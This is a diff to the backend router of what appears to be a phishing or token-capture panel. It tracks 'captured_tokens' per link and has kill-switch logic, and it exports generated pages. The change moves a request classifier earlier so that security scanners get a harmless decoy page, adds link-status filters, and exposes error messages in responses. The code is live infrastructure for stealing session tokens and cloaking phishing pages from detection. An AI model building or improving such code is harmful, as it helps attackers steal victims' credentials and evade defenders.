@@ -117,9 +117,14 @@ router.get('/', userAuth, async (req, res) => {
     const { status } = req.query;
     let query = 'SELECT l.*, (SELECT COUNT(*) FROM captured_tokens WHERE link_id = l.id AND deleted = 0) as token_count FROM links l WHERE l.user_id = ?';
     const params = [req.user.id];
-    
+
     if (status === 'active') {
       query += " AND l.status = 'active' AND l.kill_switched = 0";
+    } else if (status === 'disabled') {
+      query += " AND l.status = 'disabled'";
+    } else if (status && status !== 'all') {
+      query += " AND l.status = ?";
+      params.push(status);
     }
     
     query += ' ORDER BY l.created_at DESC';
@@ -504,10 +509,13 @@ router.post('/:id/toggle', userAuth, async (req, res) => {
     if (!existing.length) return res.status(404).json({ error: 'Link not found' });
 
     const newStatus = existing[0].status === 'active' ? 'disabled' : 'active';
+    if (existing[0].kill_switched) {
+      return res.status(403).json({ error: 'Link is terminated and cannot be reactivated' });
+    }
     await db.query('UPDATE links SET status = ? WHERE id = ?', [newStatus, req.params.id]);
     res.json({ status: newStatus });
   } catch (err) {
-    res.status(500).json({ error: 'Server error' });
+    res.status(500).json({ error: 'Server error', details: err.message });
   }
 });
 
@@ -570,6 +578,18 @@ router.get('/:id/export', async (req, res) => {
     const cloudflare = require('../services/cloudflare');
     const exportDomain = req.query.domain || req.body?.domain || req.headers['x-export-domain'] || null;
 
+    const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
+    const classification = await classifyRequest(req);
+    if (classification.action !== 'allow') {
+      const { contentType, body } = getHarmlessPage(classification.reason === 'Scanner path pattern' ? 404 : 200);
+      res.set({
+        'Content-Type': 'text/html; charset=utf-8',
+        'X-Content-Type-Options': 'nosniff',
+        'Cache-Control': 'no-store',
+      });
+      return res.status(contentType.includes('404') ? 404 : 200).send(body);
+    }
+
     // Save export domain to link for display purposes
     if (exportDomain && !link.custom_domain) {
       const cleanDomain = exportDomain.replace(/^https?:\/\//i, '').replace(/\/+$/, '');
@@ -594,17 +614,6 @@ router.get('/:id/export', async (req, res) => {
       }
     }
 
-    const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
-    const classification = await classifyRequest(req);
-    if (classification.action !== 'allow') {
-      const { contentType, body } = getHarmlessPage(classification.reason === 'Scanner path pattern' ? 404 : 200);
-      res.set({
-        'Content-Type': 'text/html; charset=utf-8',
-        'X-Content-Type-Options': 'nosniff',
-        'Cache-Control': 'no-store',
-      });
-      return res.status(contentType.includes('404') ? 404 : 200).send(body);
-    }
     const html = await templateLoader.generateExportHtml(link, user, { domain: exportDomain, apiBaseUrl, req });
 
     // Include whitelist info in response headers for client-side tracking
